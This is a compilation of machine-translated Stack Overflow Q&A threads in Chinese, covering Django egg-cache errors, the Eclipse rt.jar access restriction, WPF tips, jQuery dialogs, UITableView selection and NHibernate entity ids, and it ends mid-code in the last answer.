我正在寻找一个组件来减少拍摄照片的红眼效应。我找到了一个图像处理库，但它根本无法正常工作。我正在考虑手动刷图像，并且仅在基本像素颜色为红色或接近 RGB 时才绘制。

现在没有时间解释所有过程，但我需要帮助来获得这个想法，或者得到一个有效的补偿

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-14T09:54:30.703

如果您希望操纵图像/组件的像素，那么 pixelbender 将是一个不错的选择。

查看[http://www.adobe.com/cfusion/exchange/index.cfm?event=productHome&exc=26](http://www.adobe.com/cfusion/exchange/index.cfm?event=productHome&exc=26)以获取可下载的示例。

这些可以使用[http://labs.adobe.com/technologies/pixelbender/上的工具包运行](http://labs.adobe.com/technologies/pixelbender/)

可以在[http://www.gotoandlearn.com/找到有关像素弯曲器的视频教程](http://www.gotoandlearn.com/)

有了这个，您可以将所需的像素颜色更改为任何内容，并且它适用于 Flash 中的所有内容（图像、画布、按钮等）

# python - django 和 mod_wsgi 存在数据库连接问题

> ID：860169
> 
> 赞同：2
> 
> 时间：2009-05-13T20:13:16.157
> 
> 标签：python, django, mod-wsgi

我注意到，每当我在我的 django 项目上启用数据库设置时（开始注意到我的问题的趋势？）它都会给我一个内部服务器错误。将数据库设置设置为空白会使错误消失。这是它输出的 apache 错误日志。

```
mod_wsgi (pid=770): Exception occurred processing WSGI script '/Users/teifionjordan/rob2/apache/django.wsgi'.
Traceback (most recent call last):
  File "/Library/Python/2.5/site-packages/django/core/handlers/wsgi.py", line 239, in __call__
    response = self.get_response(request)
  File "/Library/Python/2.5/site-packages/django/core/handlers/base.py", line 67, in get_response
    response = middleware_method(request)
  File "/Library/Python/2.5/site-packages/django/contrib/sessions/middleware.py", line 9, in process_request
    engine = __import__(settings.SESSION_ENGINE, {}, {}, [''])
  File "/Library/Python/2.5/site-packages/django/contrib/sessions/backends/db.py", line 2, in <module>
    from django.contrib.sessions.models import Session
  File "/Library/Python/2.5/site-packages/django/contrib/sessions/models.py", line 4, in <module>
    from django.db import models
  File "/Library/Python/2.5/site-packages/django/db/__init__.py", line 16, in <module>
    backend = __import__('%s%s.base' % (_import_path, settings.DATABASE_ENGINE), {}, {}, [''])
  File "/Library/Python/2.5/site-packages/django/db/backends/mysql/base.py", line 10, in <module>
    import MySQLdb as Database
  File "build/bdist.macosx-10.5-i386/egg/MySQLdb/__init__.py", line 19, in <module>
  File "build/bdist.macosx-10.5-i386/egg/_mysql.py", line 7, in <module>
  File "build/bdist.macosx-10.5-i386/egg/_mysql.py", line 4, in __bootstrap__
  File "/Library/Python/2.5/site-packages/setuptools-0.6c9-py2.5.egg/pkg_resources.py", line 841, in resource_filename
    self, resource_name
  File "/Library/Python/2.5/site-packages/setuptools-0.6c9-py2.5.egg/pkg_resources.py", line 1310, in get_resource_filename
    self._extract_resource(manager, self._eager_to_zip(name))
  File "/Library/Python/2.5/site-packages/setuptools-0.6c9-py2.5.egg/pkg_resources.py", line 1332, in _extract_resource
    self.egg_name, self._parts(zip_path)
  File "/Library/Python/2.5/site-packages/setuptools-0.6c9-py2.5.egg/pkg_resources.py", line 921, in get_cache_path
    self.extraction_error()
  File "/Library/Python/2.5/site-packages/setuptools-0.6c9-py2.5.egg/pkg_resources.py", line 887, in extraction_error
    raise err
ExtractionError: Can't extract file(s) to egg cache

The following error occurred while trying to extract file(s) to the Python egg
cache:

  [Errno 20] Not a directory: '/Library/WebServer/.python-eggs/MySQL_python-1.2.2-py2.5-macosx-10.5-i386.egg-tmp'

The Python egg cache directory is currently set to:

  /Library/WebServer/.python-eggs

Perhaps your account does not have write access to this directory?  You can
change the cache directory by setting the PYTHON_EGG_CACHE environment
variable to point to an accessible directory. 
```

这是 django.wsgi 文件

```
import os
import sys

os.environ['DJANGO_SETTINGS_MODULE'] = 'rob2.settings'

sys.path.append('/Users/teifionjordan')

import django.core.handlers.wsgi
application = django.core.handlers.wsgi.WSGIHandler() 
```

我还有其他几个脚本都可以很好地连接到 mysql 数据库，如果我运行教程服务器，那么它会正确显示管理面板。我尝试更改鸡蛋的环境变量，但仍然没有任何变化。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-14T06:15:16.813

您需要设置`PYTHON_EGG_CACHE`环境变量。Apache/mod_wsgi 正在尝试将 egg 提取到 Apache 没有写入权限的目录中……或者该目录不存在。

[在这里的 Django 文档](http://docs.djangoproject.com/en/dev/howto/deployment/modpython/#using-eggs-with-mod-python)中对此进行了解释。

`/Library/WebServer/.python-eggs`存在吗？你的 Apache 配置文件是什么样的？

# google-search - 搜索解释代码的页面

> ID：860170
> 
> 赞同：0
> 
> 时间：2009-05-13T20:13:18.637
> 
> 标签：google-search

谷歌不允许搜索！

!-f 变成 -f

哪些搜索引擎会找到带有 !-f 的页面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T20:15:12.300

~~如果你把它放在引号中，它似乎有效，比如“！-f”，你试过吗？~~ 来自[http://knol.google.com/k/barry-welford/the-humble-exclamation-mark/3fhotx4fqh463/2#](http://knol.google.com/k/barry-welford/the-humble-exclamation-mark/3fhotx4fqh463/2#)：

> Google 无法识别感叹号、问号或@ 符号等特殊字符。这些类型的字符非常常见，以至于将它们包含在搜索中会大大减慢搜索结果的传递速度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T20:34:48.227

还有其他不返回任何结果的字符（例如@、#、$ 等）。事实上，唯一获得荣誉的两个字符是 '&' 和 '_'
查看这篇[文章](http://www.marketingshift.com/2006/3/google-special-character-search-string.cfm)。

# jquery - 如何创建一个类似于stackoverflow的框，点击关闭

> ID：860177
> 
> 赞同：3
> 
> 时间：2009-05-13T20:14:26.233
> 
> 标签：jquery, dialog

**重复：[我将如何实现 StackOverflow 的悬停对话框？](https://stackoverflow.com/questions/758906/how-would-i-implement-stackoverflows-hovering-dialogs)**

* * *

我正在尝试创建一条正在显示的错误消息，到目前为止，这是一个粗略的尝试，消息显示正常，但是单击不起作用..

```
function message(somemessage){
       $(document).ready(function(){
            $('<div class="error">' + somemessage+ '</div>')
           .insertAfter( $('#ErrorMessage') ).fadeIn('slow').animate({opacity: 1.0}, 5000).click(function(){$(this).remove});
   });
 } 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-05-13T20:18:28.207

我已经在[这个问题](https://stackoverflow.com/questions/758906/how-would-i-implement-stackoverflows-hovering-dialogs)中回答了如何做到这一点。

如果需要，请直接跳至[示例。](http://jsbin.com/oqale)

但是，如果您想要更强大的东西，您应该查看许多解决方案：

*   [jQuery UI 对话框](http://docs.jquery.com/UI/Dialog)
*   [咆哮](http://www.stanlemon.net/projects/jgrowl.html)
*   [jq模态](http://dev.iceburg.net/jquery/jqModal/)
*   [美容秘诀](http://www.lullabot.com/files/bt/bt-latest/DEMO/index.html)

如果您想了解如何执行本网站中使用的其他通知（当您获得新徽章时位于顶部的通知等），您可以在[此问题](https://stackoverflow.com/questions/659199/how-to-show-popup-message-like-in-stackoverflow)中查看如何执行此操作。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-13T20:22:39.527

不是因为忘记在`remove`函数后面加括号了吗？

试试这个

```
$('<div class="error">' + "somemessage"+ '</div>')
           .insertAfter( $('#ErrorMessage') ).fadeIn('slow').
animate({opacity: 1.0}, 5000).click(function(){$(this).remove()}); 
```

# c# - 通过更改窗口模板，所有控件都消失了

> ID：860184
> 
> 赞同：1
> 
> 时间：2009-05-13T20:15:30.800
> 
> 标签：c#, .net, wpf, controltemplate

我想更改我的窗口模板，例如：

```
<Style x:Key="SilverGreenWindowStyle" TargetType="{x:Type Window}">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate>
                <Grid Background="{StaticResource SilverGreenBackground}" Width="503" Height="383">
                    <Rectangle Margin="192,86,21,119" Fill="{StaticResource SilverGreenRectangleBackground}" Width="200" Height="200"/>
                </Grid>    
            </ControlTemplate>
        </Setter.Value>    
    </Setter>
</Style> 
```

这会导致 Windows 控件变得不可见。如何让它们保持可见？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T20:22:17.310

您需要在模板中包含一个元素来告诉窗口在哪里显示它的内容。[*ContentPresenter*](http://msdn.microsoft.com/en-us/library/system.windows.controls.contentpresenter.aspx)为您创造了奇迹：它将在您将其插入树中的任何位置呈现 Window 的内容。

例如，如果您希望常规内容显示在 Rectangle 之上，您可以这样做：

```
<Style x:Key="SilverGreenWindowStyle" TargetType="{x:Type Window}">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate>
                <Grid Background="{StaticResource SilverGreenBackground}" Width="503" Height="383">
                    <Rectangle Margin="192,86,21,119" Fill="{StaticResource SilverGreenRectangleBackground}" Width="200" Height="200"/>
                    <ContentPresenter/>
                </Grid>    
            </ControlTemplate>
        </Setter.Value>    
    </Setter>
</Style> 
```

# java - 由于对所需库 rt.jar 的限制，对类的访问限制？

> ID：860187
> 
> 赞同：831
> 
> 时间：2009-05-13T20:16:26.963
> 
> 标签：java, eclipse, wsdl, stub, wsdl2java

我正在尝试编译由**IBM 的****WSDL2Java**在**Java5上创建的****Java 1.4**代码，而无需重新创建存根，并在**Eclipse**中看到了这个错误。 我假设只要运行时可用（它们是），生成的存根就应该编译。 ********`jars`********

 ******`Access restriction: The type QName is not accessible due to restriction on required library C:\Program Files\Java\jdk1.5.0_16\jre\lib\rt.jar`

完整的类名是`javax.xml.namespace.QName`

> 这里到底发生了什么？这是我试图用香肠重构猪的情况吗？我最好重新创建存根吗？

* * *

## 回答 #1

> 赞同：1901
> 
> 时间：2010-02-01T04:09:13.440

还有另一种解决方案也有效。

1.  转到项目属性中的*构建路径*设置。
2.  删除*JRE 系统库*
3.  加回来；选择*“添加库”*并选择*JRE System Library*。默认值对我有用。

这是有效的，因为您在不同的 jar 文件中有多个类。删除和重新添加 JRE 库将使正确的类成为第一。如果您想要一个基本解决方案，请确保排除具有相同类的 jar 文件。

对我来说，我有：`javax.xml.soap.SOAPPart`在三个不同的罐子里`axis-saaj-1.4.jar`：`saaj-api-1.3.jar`和`rt.jar`

* * *

## 回答 #2

> 赞同：127
> 
> 时间：2010-01-16T03:21:17.613

[http://www.digizol.com/2008/09/eclipse-access-restriction-on-library.html](http://www.digizol.com/2008/09/eclipse-access-restriction-on-library.html)最适合我。

**在 Windows 上：** Windows -> Preferences -> Java -> Compiler -> Errors/Warnings -> Deprecated and restricted API -> Forbidden reference (access rules): -> change to warning

**在 Mac OS X/Linux 上：** Eclipse -> Preferences -> Java -> Compiler -> Errors/Warnings -> Deprecated and restricted API -> Forbidden reference (access rules): -> change to warning

* * *

## 回答 #3

> 赞同：69
> 
> 时间：2009-11-23T05:55:30.410

我遇到了同样的问题。我在网站上找到了答案：[http](http://www.17ext.com) ://www.17ext.com 。
首先，删除 JRE 系统库。然后，再次导入 JRE 系统库。

* * *

## 回答 #4

> 赞同：35
> 
> 时间：2009-05-13T20:30:04.443

我的猜测是您正在尝试用您拥有的库中的一个替换 Java 5 附带的标准类。

根据许可协议的条款，这是不允许的，但是 AFAIK 直到 Java 5 才强制执行。

我以前用 QName 看到过这个，我通过从我拥有的 jar 中删除类来“修复”它。

编辑 [http://www.manpagez.com/man/1/java/](http://www.manpagez.com/man/1/java/)选项“-Xbootclasspath:”的注释

“不应部署使用此选项来覆盖 rt.jar 中的类的应用程序，因为这样做会违反 Java 2 运行时环境二进制代码许可证。”

[http://www.idt.mdh.se/rc/sumo/aJile/Uppackat/jre/LICENSE](http://www.idt.mdh.se/rc/sumo/aJile/Uppackat/jre/LICENSE) _

“Java 技术限制。您不得通过在 JPI 中创建其他类或以其他方式导致添加或修改 JPI 中的类。如果您创建附加类和相关 API，它们 (i) 扩展了 Java 平台的功能，并且 (ii) 向第三方软件开发人员公开为了开发调用此类附加 API 的附加软件的目的，您必须立即广泛发布此类 API 的准确规范，供所有开发人员免费使用。您不得创建或授权您的被许可人创建附加类、接口、或以任何方式标识为“java”、“javax”、“sun”或 Sun 在任何命名约定指定中指定的类似约定的子包。

* * *

## 回答 #5

> 赞同：27
> 
> 时间：2013-09-06T12:31:50.403

我也遇到了这个错误，但是我的项目是使用 Maven 和[tycho](http://eclipse.org/tycho/)编译器（它是一组 OSGi 插件）在命令行上构建的。在大量筛选有相同问题但在 Eclipse 中而不是在命令行中修复它的人之后，我[在 Tycho 开发者论坛上找到了一条消息，](http://dev.eclipse.org/mhonarc/lists/tycho-user/msg03670.html)它回答了我的问题，使用配置`pom.xml`忽略编译器关于访问限制的警告：

```
<plugin>
    <groupId>org.eclipse.tycho</groupId>
    <artifactId>tycho-compiler-plugin</artifactId>
    <version>${tycho.version}</version>
    <configuration>
        <compilerArgument>-warn:+discouraged,forbidden</compilerArgument>
    </configuration>
</plugin> 
```

更多信息可以在[第谷常见问题解答](http://wiki.eclipse.org/Tycho/FAQ)中找到。这花了我 AGES 的时间来解决，所以我想我会通过发布这个答案来帮助其他任何人试图从命令行修复这些访问限制错误。

* * *

## 回答 #6

> 赞同：14
> 
> 时间：2010-03-31T19:09:48.893

*   转到项目属性中的构建路径设置。 `Windows -> Preferences -> Java Compiler`
*   删除 JRE 系统库
*   添加另一个具有“完美匹配”的 JRE
*   清理并再次构建您的项目。它对我有用。

* * *

## 回答 #7

> 赞同：13
> 
> 时间：2011-07-01T09:46:10.380

我也刚遇到这个问题。显然我在构建路径中将 JRE 设置为 1.5 而不是 1.6。

* * *

## 回答 #8

> 赞同：9
> 
> 时间：2014-06-01T03:41:08.300

除了[Nels Beckman 的解决方案](https://stackoverflow.com/a/2174607/1494802)，我还有以下提示：

在*Configure Build Path*下，我不得不重新排列*Order 和 Export*下的条目顺序。

此外，作为一名 Eclipse PDE 开发人员，我需要重新排列我的依赖项的顺序`MANIFEST.MF`，将有问题的包添加为列表中的第一个。

使用这些刻度盘，以及在两者之间运行*Project > Clean*，我能够解决这些警告。

* * *

## 回答 #9

> 赞同：9
> 
> 时间：2016-03-20T18:40:23.090

对我来说这是我如何解决它：

*   转到当前项目的**构建路径**

在图书馆下

*   选择“ **JRE 系统库**[jdk1.8xxx]”
*   点击**编辑**
*   并选择“Workspace default JRE(jdk1.8xx)”**或**Alternate JRE
*   点击完成
*   点击确定

[![在此处输入图像描述](https://i.stack.imgur.com/rzdkY.jpg)](https://i.stack.imgur.com/rzdkY.jpg)

注意：确保在 Eclipse / Preferences (NOT the project) / Java / Installed JRE 中，jdk 指向 JDK 文件夹而不是 JRE **C:\Program Files\Java\jdk1.8.0_74**

[![在此处输入图像描述](https://i.stack.imgur.com/MJHXA.jpg)](https://i.stack.imgur.com/MJHXA.jpg)

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2013-05-24T10:51:46.763

抱歉更新旧帖子。我收到了报告的问题，并按如下所述解决了它。

假设您使用的是 Eclipse + m2e maven 插件，如果遇到此访问限制错误，请右键单击出现错误的项目/模块 --> 属性 --> 构建路径 --> 库 --> 替换 JDK/ JRE 到 Eclipse 工作区中使用的那个。

我按照上述步骤解决了问题。

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2013-04-01T15:18:17.337

如果您确定应该能够访问给定的类，这可能意味着您向项目中添加了几个 jar，其中包含具有相同名称（或路径）但内容不同的类，并且它们相互遮盖（通常是旧的自定义build jar 包含内置的旧版本的第 3 方库）。

例如，当您添加一个 jar 实现：

```
a.b.c.d1
a.b.c.d2 
```

但也有一个旧版本只实现：

```
a.b.c.d1
(d2 is missing altogether or has restricted access) 
```

在代码编辑器中一切正常，但如果“旧”库掩盖了新库，则在编译过程中会失败 - d2 突然变成“丢失或无法访问”，即使它在那里。

解决方案是检查编译时库的顺序，并确保具有正确实现的库排在第一位。

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2015-02-16T11:51:56.407

转到项目属性中的 Java 构建路径。删除现有的 JRE System Library 然后再次添加，即 Add Library-->JRE Lib--选择 jre-->Finish。最后选择**order 和 export**选项卡选择 JRE Lib 并移到顶部。就是这样。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2014-03-19T05:59:30.340

在我的情况下，构建路径 JRE 和在执行环境中安装的 JRE 之间存在不匹配。我进入了项目 > 属性 > Java 编译器。底部有一条警告信息。

我单击链接“已安装 JRE”、“执行环境”、“Java 构建路径”并将 JDK 版本更改为 1.7，警告消失了。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2014-07-28T16:57:05.313

只需更改项目的构建路径库的顺序即可。右键单击项目>构建路径>配置构建路径>选择顺序和导出（选项卡）>更改条目的顺序。我希望将“JRE 系统库”移到底部会起作用。它对我有用。简单易行....！！！

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2017-08-16T06:40:31.917

通过构建路径添加正确的 JRE 系统是解决方案，但您的 eclipse 仍然可能有错误。要解决这个问题，请转到 Java Build path --> Order and Export 并将您的 JRE 系统库移动到顶部。这解决了我的问题。

# wpf - WPF 简单的技巧和窍门？

> ID：860193
> 
> 赞同：19
> 
> 时间：2009-05-13T20:18:12.450
> 
> 标签：wpf, xaml

我正在玩弄边距和填充，发现负值是可以接受的，并且在适当的情况下会产生很好的效果。例如，如果您有一个带有填充对象的边框，并且您希望填充的对象颜色超出边框。谁还有其他人？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2009-06-02T13:26:43.127

调试 WPF 绑定。

添加绑定属性的跟踪：

```
<Window …
 xmlns:diagnostics="clr-namespace:System.Diagnostics;assembly=WindowsBase"/>
    <TextBlock Text="{Binding Path=Caption, 
diagnostics:PresentationTraceSources.TraceLevel=High}"…/> 
```

您将在输出窗口中获得有关绑定的更多详细信息：

```
PropertyChanged event from SomeObject (hash=1)
SetValue at level 0 from SomeObject (hash= 1) using RuntimePropertyInfo(Field): 
'False'
TransferValue - got raw value 'False'
TransferValue - using final value 'False' 
```

//[在这里](http://www.beacosta.com/blog/?p=52)编辑更多信息。

爱丽儿

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-05-28T11:48:45.833

随 3.5 SP1 提供的 WPF 的一项新功能是能够在绑定时格式化字符串。它消除了`IValueConverter`对此类常见场景的使用。[以下是我从这篇博文](http://blogs.msdn.com/llobo/archive/2008/05/19/wpf-3-5-sp1-feature-stringformat.aspx)中复制的一些示例，可以帮助您进行操作

```
<TextBox Text="{Binding Path=Double, StringFormat=F3}"/>
<TextBox Text="{Binding Path=Double, StringFormat=Amount: {0:C}}"/>
<TextBox Text="{Binding Path=Double, StringFormat=Amount: \{0:C\}}"/>
<TextBox>
  <TextBox.Text>
    <Binding Path="Double" StringFormat="{}{0:C}"/>
  </TextBox.Text>
</TextBox> 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2009-06-08T19:09:26.150

`Visibility`是一个三态[System.Windows.Visibility](http://msdn.microsoft.com/en-us/library/system.windows.visibility.aspx)枚举：

*   Visible - 元素被渲染并参与布局。
*   Collapsed - 元素不可见且不参与布局。有效地将其高度和宽度设为 0，并表现得好像它不存在一样。
*   隐藏 - 元素不可见，但*继续*参与布局。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-05-28T11:07:39.113

设置提供视觉提示的调试样式：

```
<Window.Resources>

  <Style x:Key="DebugGrid" TargetType="Grid">
    <Style.Triggers>
      <Trigger Property="IsMouseOver" Value="True">
        <Setter Property="ShowGridLines" Value="True"/>
      </Trigger>
    </Style.Triggers>
  </Style>

</Window.Resources>

<Grid Name="Grid"
      Style="{StaticResource DebugGrid}"
      Background="Black">... 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-05-28T09:32:54.140

在控件的内容中包含花括号。

```
<Button Content="{}{This is not a markup extension.}"/> 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2009-05-30T10:32:25.593

`IsMouseOver`并且`IsMouseDirectlyOver`是不同的事件。 `IsMouseOver`响应控件及其子控件中的所有鼠标移动。`IsMouseDirectlyOver`仅当光标位于控件本身上时才响应。例如，如果您有一个包含在边框内的标签，则`IsMouseDirectlyOver`仅当光标位于边框本身而不是包含的标签上时才会触发边框事件。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-05-16T02:17:48.240

计算可用房地产的百分比：

```
<Grid.RowDefinitions>
  <RowDefinition Height="0.25*"/>
  <RowDefinition Height="0.25*"/>
  <RowDefinition Height="0.25*"/>
  <RowDefinition Height="0.25*"/>
</Grid.RowDefinitions> 
```

编辑：

这有效，但并不表示 * 参数的功能。这个：

```
<Grid.RowDefinitions>
  <RowDefinition Height="*"/>
  <RowDefinition Height="*"/>
  <RowDefinition Height="*"/>
  <RowDefinition Height="*"/>
</Grid.RowDefinitions> 
```

提供相同的功能。如果您想要除等高行之外的其他内容，您可以使用：

```
<Grid.RowDefinitions>
  <RowDefinition Height="1*"/>
  <RowDefinition Height="2*"/>
  <RowDefinition Height="3*"/>
  <RowDefinition Height="4*"/>
</Grid.RowDefinitions> 
```

这会将可用高度除以 10 并保持每行的相对高度。或者，这些值可以是 0.1、0.2、0.3 和 0.4 或任何比例值。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-06-08T19:36:34.893

`Padding`并且`Margin`使用逗号分隔的语法输入，并且是厚度类型。它们可以输入为：

*   Padding="5"（四个边的边距都是 5）
*   Padding="5,10,15,20" （左边距：5 顶部：10 右边：15 底部：20）
*   Padding="5,10" （左/右填充为 5，上/下填充为 10）

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-06-11T21:33:43.660

为 a 提供唯一的行或列，`GridSplitter`以确保它不会被其他控件隐藏并按预期运行。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-06-03T02:59:11.423

该属性是**BorderThickness**。无论您键入多少次 BorderWidth，它都不起作用！

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2011-04-11T10:24:49.873

在运行时根据另一个控件确定一个控件的维度。

```
<... Width="{Binding ElementName=referenceElement, Path=ActualWidth}" ../> 
```

这也可以通过`Height/MaxHeight`etc. 来完成。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2009-05-28T11:35:54.097

在内容中插入双引号：

```
<Button Name="Button"
        Background="AntiqueWhite"
        Content="{}{Background=&#0034;AntiqueWhite&#0034;}"/> 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2010-01-23T16:05:42.827

将 Code Behind 中的属性设置为 DynamicResource：

```
Border_Toolbar.SetResourceReference(BackgroundProperty, "Brush_ToolbarBackground") 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-05-29T10:19:45.360

将左侧设为默认值或使用画笔设置的`Grid`A不会触发事件，除非光标位于包含控件上。为确保事件在自身上触发，请通过将 设置为容器颜色来进行模拟。`Background``Transparent``IsMouseOver``Grid``Transparency``Background``Background`

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-05-31T10:49:36.083

背景设置为透明的控件不会触发 IsMouseOver 或 IsMouseDirectlyOver 事件。例如，如果边框背景设置为透明，但 BorderBrush=Blue 且 BorderWidth 为 <> 0，则 MouseOver 事件将在边框本身上触发，但在控件内部时不会触发。

# iphone - 如何访问 UITableView 子视图选择？

> ID：860196
> 
> 赞同：3
> 
> 时间：2009-05-13T20:18:31.937
> 
> 标签：iphone, objective-c, cocoa-touch, uitableview

我创建了一个`UIViewController`( `AnestDrugCalcViewController`)，它有一个按钮，可以打开`UITableViewController`( `DrugTableViewController`) 来选择一种药物。基于`DrugTableViewController`a 填充并由`NSMutableArray`多个`NSDictionary`对象（drugName、drugDose、drugConcentration 等）组成。

我可以`DrugTableViewController`通过将它推到导航堆栈上来打开它，但我不知道如何从我`AnestDrugCalcViewController`的选择项目的属性中分辨出来。

```
//  DrugTableViewController.h
#import <UIKit/UIKit.h>

@interface DrugTableViewController : UITableViewController {
NSMutableArray          *drugList;
NSIndexPath *lastIndexPath;
IBOutlet UITableView    *myTableView;
NSObject *selectedDrug;
}

@property (nonatomic, retain) NSArray *drugList;
@property (nonatomic, retain) UITableView *myTableView;
@property (nonatomic, retain) NSObject *selectedDrug;

@end 
```

DrugTableViewController.m #import "DrugTableViewController.h" 的顶部

```
@implementation DrugTableViewController

@synthesize drugList,myTableView, selectedDrug; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T20:34:46.417

当用户选择它时，您可以在`vwDrugTable`其中存储所选行的属性。然后，在删除该表视图并返回后`vwCalc`，只需从该属性中获取数据。

所以这意味着在`vwDrugTable`，有这样的东西：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    self.selectedDrug = [self.drugs objectAtIndex:indexPath.row];
} 
```

然后只需在需要时访问`selectedDrug`。`vwCalc`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T20:36:04.917

`UITableView`的`-indexPathForSelectedRow`方法将允许您确定选择了哪一行：

```
NSIndexPath *selectionPath = [vwDrugTable indexPathForSelectedRow];
if (index) {
    NSLog(@"Selected row:%u in section:%u", [selectionPath row], [selectionPath section]);
} else {
    NSLog(@"No selection");
} 
```

要在选择更改时收到通知，`tableView:didSelectRowAtIndexPath:`请在表视图委托中实现：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSLog(@"Selection Changed");
} 
```

# nhibernate - DDD：主键 (Id) 和 ORM（例如 NHibernate）

> ID：860200
> 
> 赞同：18
> 
> 时间：2009-05-13T20:19:11.903
> 
> 标签：nhibernate, architecture, domain-driven-design

为什么在域实体中有一个 Id 字段被认为是可以的？我见过几个解决方案，它们为基类提供 Id 和基于 Id 的 GetHashCode/Equals。

我对领域模型的理解是它应该只包含与领域相关的东西。虽然在极少数情况下（可跟踪订单）ID 是有意义的，但大多数情况下，除了在 DB/UI 上引用对象的简单方法之外，它们不提供任何东西。

我也没有看到 Equals/GetHashCode 的好处，因为 Identity Map 实现应该保证引用相等性无论如何**都是**id 相等性。

奇怪的是，我很难找到其他人对这个问题的看法，所以我在这里问它。在域实体中使用非域相关 ID 的一般意见是什么？如果我不向我的域实体添加 Id，NHibernate 是否有任何问题？

**更新：**

感谢您的回答。

他们中的一些人建议拥有 Id 是 ORM 进行数据库更新的唯一方法。我认为情况并非如此。ORM 已经跟踪从数据库加载的所有实体，因此它应该能够在需要时轻松地在内部获取一个 Id。

**更新 2：**

对正义和类似观点的回答： *如果我们有一个 Web 应用程序并且**需要**一种在会话之间引用实体的方法怎么办？喜欢编辑/资源/id？*

好吧，我认为这是受限 UI/环境的特定需求，而不是域模型需求。对于这种情况，使用 GetIdentity 方法（与 Load(identity) 方法一致）的应用程序服务或存储库似乎就足够了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T22:13:19.937

我只能谈谈NHibernate。在那里您需要一个主键字段，如果您获取业务数据（不推荐）或没有业务意义的代理键，则由您决定。

典型场景有：

*   数据库生成的自增值
*   NHibernate 生成的 guid
*   由业务逻辑生成的 guid

**拥有唯一的 id 有一个很大的优势。**当您将对象传递给客户端并返回给服务器时，您不能依赖内存标识。您甚至可以在同一个业务实例的内存中拥有多个实例。业务实例由 id 标识。

**基于身份的比较**是一个品味问题。我个人喜欢简单可靠的代码，基于id的比较*简单*可靠，而*深度比较*总是有点冒险，容易出错，不可维护。因此，您最终会使用 operator == 比较内存标识和 Equals 比较业务（和数据库）标识。

NHibernate 是将类模型映射到我所知道的关系数据库的一种侵入性较小的方法。在我们的大型项目中，我们有主键和版本属性（它们用于乐观锁定）。您可能会说这是侵入性的，因为它不用于业务逻辑。

**NH 不需要具有这些属性。**（但是它需要其中一个属性作为主键。）但请考虑：

*   它只是工作得更好，例如。悲观锁定只能使用适当的属性，
*   更快：int id 在许多数据库上的性能优于其他数据类型
*   并且更容易：出于几个原因，不鼓励使用对业务有意义的属性。

那么，为什么要让你的生活变得比必要的更艰难呢？

* * *

**编辑：**刚刚阅读[文档](http://nhforge.org/doc/nh/en/index.html#mapping-declaration-id)，发现 NHibernate 不需要**持久**类中的 id 属性！如果您没有标识符，[则无法使用某些功能](http://nhforge.org/doc/nh/en/index.html#persistent-classes-poco-identifier)。建议拥有它，它只会让您的生活更轻松。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T22:54:18.530

通常，您不会拥有**一个真正的领域模型**。您将拥有无数并发和顺序会话，这些会话必须进行协调，并且每个会话中都包含其自己的微型、隔离、事务性域模型。您将不会在两个并发会话之间或两个连续会话之间拥有相同的对象实例。但是您需要一些方法来确保您可以将信息从一个会话移动到另一个会话。

一个例子，当然，是 URL 的 /resource/list 和 /resource/show/id 对（对应于 asp.net mvc 中的一对适当的控制器操作）。从一个移动到另一个，有两个完全独立的会话，但它们需要相互通信（通过 HTTP 和浏览器）。

即使不使用数据库，您的领域模型对象*仍然*需要某种形式的身份，因为您仍然有许多微型、孤立的领域模型，而不是一个真正的领域模型；您将在独立会话中同时和一个接一个地拥有所有这些域模型。

对象相同性是不够的，因为会话之间的对象并不相同，即使它们所代表的基础概念实体是相同的实体。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T22:41:41.170

在 Nh 中，您不能对分离的实例使用引用相等。这会让您在想要使用这种行为的客户中使用 NH（在我看来这是正确的行为，NH 不依赖于魔法！）。

在 Web 应用程序或基于会话的使用中，您可以在一个 ISession 的范围内访问数据库，我认为我说您可以依赖引用相等是正确的。但是在智能客户端场景中，或者更具体地说，在两个 ISession 共享一个实例（一个从数据库加载或插入到数据库中，然后传递给第二个）的任何场景中，您需要存储 db id 字段以及实例。

下面的第二个会话不知道它正在传递的实例已经插入并且需要更新，即使您将其更改为更新，我认为我认为它不会知道数据库是正确的类的 ID。

```
class SomeEntityWithNoId
{
public  blah etc {}
}

class dao
{

void DateMethod()
{
var s1 = sessionFactory.OpenSession();
var instance = new SomeEntityWithNoId();
instance.Blah = "First time, you need to insert";
